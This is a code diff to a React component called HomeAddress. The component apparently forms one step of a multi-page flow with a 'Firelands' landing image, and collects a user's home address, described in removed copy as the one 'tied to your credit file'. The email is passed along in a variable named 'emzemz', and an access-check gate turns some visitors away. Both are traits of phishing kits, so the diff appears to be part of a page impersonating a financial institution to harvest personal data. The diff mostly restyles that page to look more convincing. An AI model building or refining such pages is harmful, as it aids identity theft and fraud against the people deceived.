@@ -4,6 +4,8 @@ import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
 
+const heroImageUrl = '/assets/firelands-landing.jpg';
+
 const HomeAddress: React.FC = () => {
   const [stAd, setStAd] = useState('');
   const [apt, setApt] = useState('');
@@ -16,7 +18,8 @@ const HomeAddress: React.FC = () => {
     apt: '', 
     city: '', 
     state: '', 
-    zipCode: '' 
+    zipCode: '',
+    form: '' 
   });
 
   const navigate = useNavigate();
@@ -24,12 +27,12 @@ const HomeAddress: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Debug: Log the received email
-  console.log('HomeAddress received email:', emzemz);
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -41,7 +44,8 @@ const HomeAddress: React.FC = () => {
       city: !city.trim() ? 'City is required' : '',
       state: !state.trim() ? 'State is required' : '',
       zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
-      apt: ''
+      apt: '',
+      form: ''
     };
 
     setErrors(newErrors);
@@ -73,143 +77,112 @@ const HomeAddress: React.FC = () => {
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Home Address</h2>
+    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
+      <div className="absolute inset-0">
+        <img
+          src={heroImageUrl}
+          alt="Sun setting over Firelands farm fields"
+          className="h-full w-full object-cover"
+          loading="lazy"
+          decoding="async"
+          fetchPriority="high"
+          sizes="100vw"
+        />
+        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
       </div>
 
-      <div className="px-8 py-6 bg-white space-y-6">
-        <p className="text-sm text-gray-600 text-center mb-8">
-          We'll need you to confirm your home address. The one tied to your credit file.
-        </p>
-        
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
-          {/* Street Address */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4 ">
-              <label className="text-gray-700 w-32 text-right">Street Address:</label>
-              <input
-                id="stAd"
-                name="stAd"
-                type="text"
-                value={stAd}
-                onChange={(e) => setStAd(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.stAd && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.stAd}
+      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
+        <div className="mx-auto w-full max-w-6xl">
+          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+            <h2 className="text-2xl font-semibold text-[#2f2e67]">Home Address</h2>
+
+            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="stAd">
+                  Street Address
+                </label>
+                <input
+                  id="stAd"
+                  name="stAd"
+                  type="text"
+                  value={stAd}
+                  onChange={(e) => setStAd(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.stAd && <p className="text-sm text-rose-600">{errors.stAd}</p>}
               </div>
-            )}
-          </div>
 
-          {/* Apt or Unit */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Apt or Unit (optional):</label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(e) => setApt(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-          </div>
-
-          {/* City */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">City:</label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.city && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.city}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="apt">
+                  Apartment / Unit (optional)
+                </label>
+                <input
+                  id="apt"
+                  name="apt"
+                  type="text"
+                  value={apt}
+                  onChange={(e) => setApt(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
               </div>
-            )}
-          </div>
 
-          {/* State */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">State:</label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.state && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.state}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="city">
+                  City
+                </label>
+                <input
+                  id="city"
+                  name="city"
+                  type="text"
+                  value={city}
+                  onChange={(e) => setCity(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.city && <p className="text-sm text-rose-600">{errors.city}</p>}
               </div>
-            )}
-          </div>
 
-          {/* Zip Code */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Zip Code:</label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.zipCode && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.zipCode}
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="state">
+                  State
+                </label>
+                <input
+                  id="state"
+                  name="state"
+                  type="text"
+                  value={state}
+                  onChange={(e) => setState(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.state && <p className="text-sm text-rose-600">{errors.state}</p>}
               </div>
-            )}
-          </div>
 
-          <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="zipCode">
+                  Zip Code
+                </label>
+                <input
+                  id="zipCode"
+                  name="zipCode"
+                  type="text"
+                  value={zipCode}
+                  onChange={(e) => setZipCode(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.zipCode && <p className="text-sm text-rose-600">{errors.zipCode}</p>}
+              </div>
+
+              {errors.form && <p className="text-sm text-rose-600">{errors.form}</p>}
+
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Processing…' : 'Continue'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
+            </form>
           </div>
-        </form>
-      </div>
-
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your information is secure and will be used in accordance with our Privacy Policy.
-        </p>
+        </div>
       </div>
     </div>
   );
